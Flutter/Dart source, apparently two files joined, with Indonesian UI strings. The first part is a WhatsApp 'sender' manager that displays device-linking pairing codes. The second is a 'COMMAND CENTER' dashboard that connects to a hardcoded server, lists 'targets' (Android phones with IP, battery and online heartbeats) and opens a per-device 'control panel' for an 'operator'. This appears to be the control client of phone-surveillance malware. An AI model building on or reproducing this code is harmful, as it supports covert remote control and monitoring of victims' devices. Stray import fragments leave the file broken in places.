              padding: const EdgeInsets.symmetric(vertical: 22, horizontal: 24),
              decoration: BoxDecoration(
                color: const Color(0xFF070E1A),
                borderRadius: BorderRadius.circular(16),
                border: Border.all(
                  color: _C.redMid.withOpacity(_glow.value * 0.6),
                  width: 1.5,
                ),
                boxShadow: [
                  BoxShadow(
                    color: _C.redMid.withOpacity(_glow.value * 0.25),
                    blurRadius: 20,
                    spreadRadius: 0,
                  ),
                ],
              ),
              child: Text(
                widget.code,
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: _C.redLight.withOpacity(0.9 + _glow.value * 0.1),
                  fontSize: 36,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 10,
                  fontFamily: 'monospace',
                ),
              ),
            ),
          ),

          const SizedBox(height: 12),

          // Copy button
          _CopyBtn(
            code: widget.code,
            onCopied: () => setState(() => _copied = true),
            copied: _copied,
          ),

          const SizedBox(height: 8),

          // Instruction
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: _C.red.withOpacity(0.07),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _C.border),
            ),
            child: const Row(children: [
              Icon(Icons.info_outline_rounded, color: _C.textSub, size: 15),
              SizedBox(width: 8),
              Expanded(
                child: Text(
                  'Buka WhatsApp → Linked Devices → Link a device → Enter code',
                  style: TextStyle(color: _C.textSub, fontSize: 11, height: 1.4),
                ),
              ),
            ]),
          ),

          const SizedBox(height: 20),

          _GradBtn(
            label: 'Selesai & Refresh',
            icon: Icons.check_rounded,
            fullWidth: true,
            onTap: widget.onClose,
          ),
        ],
      ),
    );
  }
}

// ─── Copy Button ──────────────────────────────────────────────────────────────
class _CopyBtn extends StatelessWidget {
  final String code;
  final VoidCallback onCopied;
  final bool copied;

  const _CopyBtn({
    required this.code,
    required this.onCopied,
    required this.copied,
  });

  @override
  Widget build(BuildContext context) {
    return SizedBox(
      width: double.infinity,
      height: 44,
      child: _PressableInk(
        onTap: copied
            ? null
            : () async {
                await Clipboard.setData(ClipboardData(text: code));
                onCopied();
              },
        borderRadius: 12,
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 250),
          decoration: BoxDecoration(
            color: copied
                ? _C.green.withOpacity(0.12)
                : _C.surface,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(
              color: copied
                  ? _C.green.withOpacity(0.4)
                  : _C.border,
            ),
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              AnimatedSwitcher(
                duration: const Duration(milliseconds: 200),
                child: Icon(
                  copied ? Icons.check_rounded : Icons.copy_rounded,
                  key: ValueKey(copied),
                  color: copied ? _C.green : _C.textSub,
                  size: 16,
                ),
              ),
              const SizedBox(width: 8),
              AnimatedSwitcher(
                duration: const Duration(milliseconds: 200),
                child: Text(
                  copied ? 'Disalin!' : 'Salin Kode',
                  key: ValueKey(copied),
                  style: TextStyle(
                    color: copied ? _C.green : _C.textSub,
                    fontWeight: FontWeight.w600,
                    fontSize: 13,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ─── Stat Strip ──────────────────────────────────────────────────────────────
class _StatStrip extends StatelessWidget {
  final int total;
  const _StatStrip({required this.total});

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: _C.border),
      ),
      child: Row(
        children: [
          const Icon(Icons.wifi_tethering_rounded,
              color: _C.redLight, size: 18),
          const SizedBox(width: 10),
          Text('$total sender terdaftar',
              style: const TextStyle(
                  color: _C.text,
                  fontSize: 13,
                  fontWeight: FontWeight.w600)),
          const Spacer(),
          Container(
            padding:
                const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(
              color: _C.green.withOpacity(0.1),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: _C.green.withOpacity(0.3)),
            ),
            child: const Text('LIVE',
                style: TextStyle(
                    color: _C.green,
                    fontSize: 10,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 0.8)),
          ),
        ],
      ),
    );
  }
}

// ─── Stagger Item ────────────────────────────────────────────────────────────
class _StaggerItem extends StatelessWidget {
  final int index;
  final Widget child;

  const _StaggerItem({required this.index, required this.child});

  @override
  Widget build(BuildContext context) {
    return TweenAnimationBuilder<double>(
      tween: Tween(begin: 0, end: 1),
      duration: Duration(milliseconds: 400 + (index * 70).clamp(0, 500)),
      curve: Curves.easeOutCubic,
      builder: (_, v, ch) => Opacity(
        opacity: v,
        child: Transform.translate(offset: Offset(0, 20 * (1 - v)), child: ch),
      ),
      child: child,
    );
  }
}

// ─── Empty State ──────────────────────────────────────────────────────────────
class _EmptyState extends StatefulWidget {
  final VoidCallback onAdd;
  const _EmptyState({required this.onAdd});

  @override
  State<_EmptyState> createState() => _EmptyStateState();
}

class _EmptyStateState extends State<_EmptyState>
    with SingleTickerProviderStateMixin {
  late AnimationController _c;
  late Animation<double> _float;

  @override
  void initState() {
    super.initState();
    _c = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 2200),
    )..repeat(reverse: true);
    _float = Tween<double>(begin: -6, end: 6)
        .animate(CurvedAnimation(parent: _c, curve: Curves.easeInOut));
  }

  @override
  void dispose() { _c.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            AnimatedBuilder(
              animation: _float,
              builder: (_, ch) => Transform.translate(
                  offset: Offset(0, _float.value), child: ch),
              child: Container(
                width: 90, height: 90,
                decoration: BoxDecoration(
                  color: _C.card,
                  shape: BoxShape.circle,
                  border: Border.all(color: _C.borderLit),
                  boxShadow: [
                    BoxShadow(
                        color: _C.red.withOpacity(0.2), blurRadius: 30),
                  ],
                ),
                child: const Icon(FontAwesomeIcons.whatsapp,
                    color: _C.redLight, size: 38),
              ),
            ),
            const SizedBox(height: 28),
            const Text('Belum Ada Sender',
                style: TextStyle(
                    color: _C.text,
                    fontSize: 20,
                    fontWeight: FontWeight.w700)),
            const SizedBox(height: 10),
            const Text(
              'Tambah WhatsApp sender pertama\nuntuk mulai mengirim pesan.',
              textAlign: TextAlign.center,
              style: TextStyle(color: _C.textSub, fontSize: 14, height: 1.5),
            ),
            const SizedBox(height: 36),
            _GradBtn(
              label: 'Tambah Sender',
              icon: Icons.add_rounded,
              onTap: widget.onAdd,
            ),
          ],
        ),
      ),
    );
  }
}

// ─── Error State ──────────────────────────────────────────────────────────────
class _ErrorState extends StatelessWidget {
  final String message;
  final VoidCallback onRetry;
  const _ErrorState({required this.message, required this.onRetry});

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 72, height: 72,
              decoration: BoxDecoration(
                color: _C.red.withOpacity(0.08),
                shape: BoxShape.circle,
                border: Border.all(color: _C.red.withOpacity(0.3)),
              ),
              child: const Icon(Icons.wifi_off_rounded,
                  color: _C.red, size: 30),
            ),
            const SizedBox(height: 24),
            const Text('Koneksi Gagal',
                style: TextStyle(
                    color: _C.text,
                    fontSize: 20,
                    fontWeight: FontWeight.w700)),
            const SizedBox(height: 10),
            Text(message,
                textAlign: TextAlign.center,
                style: const TextStyle(
                    color: _C.textSub, fontSize: 13, height: 1.5)),
            const SizedBox(height: 32),
            _GradBtn(
              label: 'Coba Lagi',
              icon: Icons.refresh_rounded,
              onTap: onRetry,
            ),
          ],
        ),
      ),
    );
  }
}

// ─── Reusable primitives ─────────────────────────────────────────────────────

/// Shell container untuk semua dialog
class _DialogShell extends StatelessWidget {
  final Widget child;
  final Color? accentColor;

  const _DialogShell({required this.child, this.accentColor});

  @override
  Widget build(BuildContext context) {
    final color = accentColor ?? _C.redMid;
    return Container(
      constraints: const BoxConstraints(maxWidth: 380),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: color.withOpacity(0.25), width: 1.5),
        boxShadow: [
          BoxShadow(
            color: color.withOpacity(0.15),
            blurRadius: 50,
            spreadRadius: 0,
          ),
        ],
      ),
      padding: const EdgeInsets.all(24),
      child: child,
    );
  }
}

class _DialogIcon extends StatelessWidget {
  final IconData icon;
  final Color color;

  const _DialogIcon({required this.icon, required this.color});

  @override
  Widget build(BuildContext context) {
    return Container(
      width: 46, height: 46,
      decoration: BoxDecoration(
        color: color.withOpacity(0.1),
        borderRadius: BorderRadius.circular(13),
        border: Border.all(color: color.withOpacity(0.25)),
      ),
      child: Icon(icon, color: color, size: 22),
    );
  }
}

/// Gradient primary button
class _GradBtn extends StatefulWidget {
  final String label;
  final IconData? icon;
  final VoidCallback onTap;
  final LinearGradient gradient;
  final bool fullWidth;

  const _GradBtn({
    required this.label,
    required this.onTap,
    this.icon,
    this.gradient = _C.btnGrad,
    this.fullWidth = false,
  });

  @override
  State<_GradBtn> createState() => _GradBtnState();
}

class _GradBtnState extends State<_GradBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedScale(
        scale: _down ? 0.96 : 1.0,
        duration: const Duration(milliseconds: 120),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 120),
          height: 46,
          width: widget.fullWidth ? double.infinity : null,
          padding: widget.fullWidth
              ? EdgeInsets.zero
              : const EdgeInsets.symmetric(horizontal: 24),
          decoration: BoxDecoration(
            gradient: widget.gradient,
            borderRadius: BorderRadius.circular(13),
            boxShadow: _down
                ? []
                : [
                    BoxShadow(
                      color: _C.redMid.withOpacity(0.3),
                      blurRadius: 16,
                      offset: const Offset(0, 4),
                    ),
                  ],
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            mainAxisSize: widget.fullWidth ? MainAxisSize.max : MainAxisSize.min,
            children: [
              if (widget.icon != null) ...[
                Icon(widget.icon, color: Colors.white, size: 17),
                const SizedBox(width: 8),
              ],
              Text(widget.label,
                  style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w700,
                    fontSize: 14,
                    letterSpacing: 0.3,
                  )),
            ],
          ),
        ),
      ),
    );
  }
}

/// Outline secondary button
class _OutlineBtn extends StatefulWidget {
  final String label;
  final VoidCallback onTap;
  const _OutlineBtn({required this.label, required this.onTap});

  @override
  State<_OutlineBtn> createState() => _OutlineBtnState();
}

class _OutlineBtnState extends State<_OutlineBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 120),
        height: 46,
        decoration: BoxDecoration(
          color: _down ? _C.border.withOpacity(0.5) : Colors.transparent,
          borderRadius: BorderRadius.circular(13),
          border: Border.all(color: _down ? _C.textDim : _C.border),
        ),
        child: Center(
          child: Text(widget.label,
              style: const TextStyle(
                  color: _C.textSub,
                  fontWeight: FontWeight.w600,
                  fontSize: 14)),
        ),
      ),
    );
  }
}

/// Input field
class _InputField extends StatelessWidget {
  final TextEditingController controller;
  final String label;
  final String? hint;
  final IconData icon;
  final TextInputType keyboardType;

  const _InputField({
    required this.controller,
    required this.label,
    required this.icon,
    this.hint,
    this.keyboardType = TextInputType.text,
  });

  @override
  Widget build(BuildContext context) {
    return TextField(
      controller: controller,
      keyboardType: keyboardType,
      style: const TextStyle(
          color: _C.text, fontSize: 14, fontWeight: FontWeight.w500),
      cursorColor: _C.redMid,
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: const TextStyle(color: _C.textSub, fontSize: 13),
        hintStyle: const TextStyle(color: _C.textDim),
        floatingLabelStyle:
            const TextStyle(color: _C.redMid, fontSize: 12),
        prefixIcon: Icon(icon, color: _C.textSub, size: 18),
        filled: true,
        fillColor: _C.surface,
        contentPadding:
            const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
        border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(14),
            borderSide: const BorderSide(color: _C.border)),
        enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(14),
            borderSide: const BorderSide(color: _C.border)),
        focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(14),
            borderSide: const BorderSide(color: _C.redMid, width: 1.5)),
      ),
    );
  }
}

/// AppBar icon button
class _AppBarBtn extends StatefulWidget {
  final IconData icon;
  final VoidCallback? onTap;
  final bool spinning;

  const _AppBarBtn({required this.icon, this.onTap, this.spinning = false});

  @override
  State<_AppBarBtn> createState() => _AppBarBtnState();
}

class _AppBarBtnState extends State<_AppBarBtn>
    with SingleTickerProviderStateMixin {
  bool _down = false;
  late AnimationController _spinCtrl;

  @override
  void initState() {
    super.initState();
    _spinCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 700),
    );
  }

  @override
  void didUpdateWidget(_AppBarBtn old) {
    super.didUpdateWidget(old);
    if (widget.spinning && !old.spinning) {
      _spinCtrl.repeat();
    } else if (!widget.spinning) {
      _spinCtrl.stop();
      _spinCtrl.reset();
    }
  }

  @override
  void dispose() { _spinCtrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap?.call(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 120),
        width: 40, height: 40,
        margin: const EdgeInsets.only(top: 4, bottom: 4),
        decoration: BoxDecoration(
          color: _down ? _C.border : _C.surface,
          borderRadius: BorderRadius.circular(11),
          border: Border.all(color: _C.border),
        ),
        child: AnimatedBuilder(
          animation: _spinCtrl,
          builder: (_, child) => Transform.rotate(
            angle: _spinCtrl.value * math.pi * 2,
            child: child,
          ),
          child: Icon(widget.icon,
              color: widget.onTap == null ? _C.textDim : _C.textSub,
              size: 18),
        ),
      ),
    );
  }
}

/// Dots loading animation
class _DotsLoader extends StatefulWidget {
  const _DotsLoader();

  @override
  State<_DotsLoader> createState() => _DotsLoaderState();
}

class _DotsLoaderState extends State<_DotsLoader>
    with SingleTickerProviderStateMixin {
  late AnimationController _c;

  @override
  void initState() {
    super.initState();
    _c = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 900))
      ..repeat();
  }

  @override
  void dispose() { _c.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _c,
      builder: (_, __) => Row(
        mainAxisSize: MainAxisSize.min,
        children: List.generate(3, (i) {
          final t = ((_c.value - i / 3) % 1.0).clamp(0.0, 1.0);
          final scale = math.sin(t * math.pi);
          return Padding(
            padding: const EdgeInsets.symmetric(horizontal: 4),
            child: Transform.scale(
              scale: 0.4 + scale * 0.6,
              child: Container(
                width: 9, height: 9,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: _C.redMid.withOpacity(0.4 + scale * 0.6),
                ),
              ),
            ),
          );
        }),
      ),
    );
  }
}

/// Thin progress bar
class _ThinProgress extends StatelessWidget {
  const _ThinProgress();

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 40),
      height: 2,
      child: const LinearProgressIndicator(
        backgroundColor: _C.border,
        color: _C.redMid,
        borderRadius: BorderRadius.all(Radius.circular(2)),
      ),
    );
  }
}

/// Pressable ink wrapper
class _PressableInk extends StatelessWidget {
  final Widget child;
  final VoidCallback? onTap;
  final double borderRadius;

  const _PressableInk({
    required this.child,
    this.onTap,
    this.borderRadius = 12,
  });

  @override
  Widget build(BuildContext context) {
    return Material(
      color: Colors.transparent,
      borderRadius: BorderRadius.circular(borderRadius),
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(borderRadius),
        splashColor: _C.red.withOpacity(0.15),
        child: child,
      ),
    );
  }
}


as http;





as IO;


class DeviceDashboardPage extends StatefulWidget {
  final String username; 

  const DeviceDashboardPage({super.key, required this.username});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> with TickerProviderStateMixin {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  late VideoPlayerController _videoController;
  bool _videoInitialized = false;
  bool _videoError = false;

  final TextEditingController _searchController = TextEditingController();
  String _searchQuery = "";
  
  // Socket untuk Real-Time
  late IO.Socket _socket;
  
  // Animation Controllers
  late AnimationController _glowController;
  late AnimationController _fadeController;
  late AnimationController _rotateController;
  late Animation<double> _glowAnimation;
  late Animation<double> _fadeAnimation;
  late Animation<double> _rotateAnimation;

  // THEME MERAH (KONSISTEN DENGAN FILE LAIN)
  final Color _primaryColor = const Color(0xFFBD1B1B);
  final Color _secondaryColor = const Color(0xFFE82D2D);
  final Color _accentColor = const Color(0xFFF55656);
  final Color _successColor = const Color(0xFF22C55E);
  final Color _warningColor = const Color(0xFFF59E0B);
  final Color _darkBg = const Color(0xFF050A12);
  final Color _darkerBg = const Color(0xFF0A0505);
  final Color _surfaceColor = const Color(0xFF150A0A);
  final Color _cardColor = const Color(0xFF250E0E);
  final Color _glowColor1 = const Color(0xFFDC2626);
  final Color _glowColor2 = const Color(0xFFEF4444);
  final Color _glowColor3 = const Color(0xFFF87171);
  final Color _goldColor = const Color(0xFFD4A843);
  final Color _roseColor = const Color(0xFFEF4444);

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _initializeVideo();
    _fetchDevices();
    _initSocket();
    
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) {
      if (mounted) setState(() {});
    });
    
    _searchController.addListener(() {
      setState(() {
        _searchQuery = _searchController.text;
      });
    });
  }

  void _initializeAnimations() {
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 2500),
      vsync: this,
    );
    _glowController.repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _fadeController = AnimationController(
      duration: const Duration(milliseconds: 1200),
      vsync: this,
    );
    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _fadeController, curve: Curves.easeOutCubic),
    );
    _fadeController.forward();

    _rotateController = AnimationController(
      duration: const Duration(seconds: 20),
      vsync: this,
    );
    _rotateController.repeat();
    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );
  }

  void _initSocket() {
    try {
      _socket = IO.io(
        'http://cloudnex.biz.id:4206',
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL_${widget.username}'})
            .enableAutoConnect()
            .build(),
      );

      _socket.onConnect((_) {
        debugPrint("[+] Admin Socket Connected to Dashboard");
      });

      _socket.on('target_status', (data) {
        if (mounted) {
          setState(() {
            int index = _devices.indexWhere((d) => d['id'] == data['id']);
            if (index != -1) {
              _devices[index]['status'] = data['status'].toString().toLowerCase() == 'online' ? 'Online' : 'Offline';
              if (data['status'].toString().toLowerCase() == 'online') {
                _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
              }
            }
          });
        }
      });

      _socket.on('heartbeat', (data) {
        if (mounted) {
          setState(() {
            int index = _devices.indexWhere((d) => d['id'] == data['deviceId']);
            if (index != -1) {
              _devices[index]['battery'] = data['battery'];
              _devices[index]['status'] = 'Online';
              _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
            }
          });
        }
      });

      _socket.on('device_info', (data) {
        if (mounted && data['admin'] == widget.username) {
          _fetchDevices();
        }
      });

      _socket.connect();
    } catch (e) {
      debugPrint("Socket error: $e");
    }
  }

  void _initializeVideo() {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/splash.mp4')
        ..initialize().then((_) {
          if (mounted) {
            setState(() {
              _videoInitialized = true;
            });
            _videoController.setLooping(true);
            _videoController.play();
            _videoController.setVolume(0);
          }
        }).catchError((error) {
          debugPrint('Video initialization error: $error');
          if (mounted) setState(() => _videoError = true);
        });
    } catch (e) {
      debugPrint('Video controller creation error: $e');
      if (mounted) setState(() => _videoError = true);
    }
  }

  Widget _buildAnimatedBackground() {
    return Stack(
      children: [
        if (_videoInitialized && !_videoError)
          SizedBox.expand(
            child: FittedBox(
              fit: BoxFit.cover,
              child: SizedBox(
                width: _videoController.value.size.width,
                height: _videoController.value.size.height,
                child: Opacity(opacity: 0.06, child: VideoPlayer(_videoController)),
              ),
            ),
          )
        else
          Container(
            decoration: BoxDecoration(
              gradient: RadialGradient(
                center: const Alignment(-0.2, -0.4),
                radius: 1.6,
                colors: [_glowColor1.withOpacity(0.05), _darkerBg, _darkBg],
              ),
            ),
          ),

        // Rotating rings - warna merah
        AnimatedBuilder(
          animation: _rotateAnimation,
          builder: (context, _) {
            final size = MediaQuery.of(context).size;
            return Stack(
              children: [
                Positioned(
                  bottom: -size.height * 0.15,
                  right: -size.width * 0.2,
                  child: Transform.rotate(
                    angle: _rotateAnimation.value * pi * 2,
                    child: Container(
                      width: size.width * 0.7,
                      height: size.width * 0.7,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: _glowColor1.withOpacity(0.05), width: 1),
                      ),
                    ),
                  ),
                ),
                Positioned(
                  top: -size.height * 0.08,
                  left: -size.width * 0.15,
                  child: Transform.rotate(
                    angle: -_rotateAnimation.value * pi,
                    child: Container(
                      width: size.width * 0.5,
                      height: size.width * 0.5,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: _glowColor2.withOpacity(0.06), width: 0.8),
                      ),
                    ),
                  ),
                ),
              ],
            );
          },
        ),

        // Vignette
        Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: Alignment.center,
              radius: 1.0,
              colors: [
                Colors.transparent,
                Colors.black.withOpacity(0.55),
              ],
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildGlassCard({required Widget child}) {
    return Container(
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _glowColor1.withOpacity(0.12), width: 1),
        boxShadow: [
          BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 16, offset: const Offset(0, 6)),
        ],
      ),
      child: child,
    );
  }

  @override
  void dispose() {
    _timer?.cancel();
    _socket.disconnect();
    _socket.dispose();
    _videoController.dispose();
    _searchController.dispose();
    _glowController.dispose();
    _fadeController.dispose();
    _rotateController.dispose();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      final response = await http.get(
        Uri.parse("http://cloudnex.biz.id:4206/api/list-targets?username=${widget.username}"),
      );

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
      if (mounted) {
        setState(() => _isLoading = false);
      }
    }
  }

  List<dynamic> get _filteredDevices {
    if (_searchQuery.isEmpty) return _devices;
    return _devices.where((d) {
      String searchStr = "${d['model']} ${d['id']} ${d['ip']}".toLowerCase();
      return searchStr.contains(_searchQuery.toLowerCase());
    }).toList();
  }

  bool _isDeviceReallyOnline(dynamic device) {
    if (device['status'] == 'Offline') return false;
    if (device['lastSeen'] == null) return false;

    try {
      DateTime lastSeen = DateTime.parse(device['lastSeen'].toString());
      DateTime now = DateTime.now();
      
      if (now.difference(lastSeen).inSeconds > 20) {
        return false;
      }
      return true;
    } catch (e) {
      return false;
    }
  }

  Widget _buildNeonHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 8),
      child: AnimatedBuilder(
        animation: _glowAnimation,
        builder: (context, _) {
          return Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
            decoration: BoxDecoration(
              color: _cardColor,
              borderRadius: BorderRadius.circular(24),
              border: Border.all(color: _glowColor1.withOpacity(0.3), width: 1.5),
              boxShadow: [
                BoxShadow(
                  color: _glowColor1.withOpacity(0.12 * _glowAnimation.value),
                  blurRadius: 20,
                  spreadRadius: 2,
                ),
              ],
            ),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: _glowColor1.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                  ),
                  child: const Icon(Icons.security, color: Color(0xFFDC2626), size: 22),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      ShaderMask(
                        shaderCallback: (bounds) => LinearGradient(
                          colors: [_glowColor1, _accentColor, _glowColor2],
                        ).createShader(bounds),
                        child: const Text(
                          "COMMAND CENTER",
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 18,
                            fontWeight: FontWeight.w900,
                            fontFamily: "Rajdhani",
                            letterSpacing: 3,
                          ),
                        ),
                      ),
                      const SizedBox(height: 4),
                      Text(
                        "Device Management - ${widget.username.toUpperCase()}",
                        style: TextStyle(
                          color: _glowColor2.withOpacity(0.7),
                          fontSize: 10,
                          fontFamily: "Rajdhani",
                          fontWeight: FontWeight.w600,
                          letterSpacing: 1,
                        ),
                      ),
                    ],
                  ),
                ),
                GestureDetector(
                  onTap: () {
                    setState(() => _isLoading = true);
                    _fetchDevices();
                  },
                  child: Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      color: _glowColor1.withOpacity(0.08),
                      shape: BoxShape.circle,
                      border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                    ),
                    child: Icon(Icons.refresh, color: _glowColor1, size: 20),
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildStatBox(String title, String value, Color valueColor) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: _cardColor,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: valueColor.withOpacity(0.2), width: 1),
        ),
        child: Column(
          children: [
            Text(
              value,
              style: TextStyle(
                color: valueColor,
                fontSize: 20,
                fontWeight: FontWeight.w800,
                fontFamily: "Rajdhani",
                letterSpacing: 1,
                shadows: [Shadow(color: valueColor.withOpacity(0.4), blurRadius: 8)],
              ),
            ),
            const SizedBox(height: 4),
            Text(
              title,
              style: TextStyle(
                color: Colors.white.withOpacity(0.4),
                fontSize: 9,
                fontWeight: FontWeight.w700,
                letterSpacing: 2,
                fontFamily: "Rajdhani",
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSearchBar() {
    return Container(
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _glowColor1.withOpacity(0.15), width: 1),
      ),
      child: TextField(
        controller: _searchController,
        style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
        decoration: InputDecoration(
          hintText: "Search device, IP, ID...",
          hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 12, fontFamily: 'Rajdhani'),
          prefixIcon: Icon(Icons.search, color: _glowColor2.withOpacity(0.5), size: 18),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        ),
      ),
    );
  }

  Widget _buildDeviceCard(dynamic device, int index) {
    bool isActive = _isDeviceReallyOnline(device); 
    Color statusColor = isActive ? _successColor : _roseColor;
    
    return GestureDetector(
      onTap: () {
        Navigator.pushNamed(
          context, 
          '/control_panel', 
          arguments: {
            "device": device,
            "operator": widget.username
          } 
        );
      },
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: _cardColor,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: statusColor.withOpacity(isActive ? 0.3 : 0.1),
            width: isActive ? 1.2 : 1,
          ),
          boxShadow: isActive ? [
            BoxShadow(
              color: statusColor.withOpacity(0.08),
              blurRadius: 16,
              spreadRadius: 1,
            )
          ] : [],
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: statusColor.withOpacity(0.1),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                  color: statusColor.withOpacity(0.25),
                  width: 1,
                ),
              ),
              child: Icon(Icons.phone_android, color: statusColor, size: 20),
            ),
            const SizedBox(width: 16),
            
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    device['model'] ?? "Unknown Device",
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 14,
                      fontWeight: FontWeight.w800,
                      fontFamily: "Rajdhani",
                      letterSpacing: 1,
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                  const SizedBox(height: 4),
                  Row(
                    children: [
                      Text(
                        device['release'] != null ? "Android ${device['release']}" : "Android OS",
                        style: TextStyle(color: Colors.white.withOpacity(0.45), fontSize: 10, fontFamily: "Rajdhani", fontWeight: FontWeight.w500),
                      ),
                      const SizedBox(width: 8),
                      Icon(FontAwesomeIcons.wifi, color: Colors.white.withOpacity(0.2), size: 10),
                    ],
                  ),
                ],
              ),
            ),

            Column(
              crossAxisAlignment: CrossAxisAlignment.end,
              children: [
                Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: BoxDecoration(
                        color: statusColor,
                        shape: BoxShape.circle,
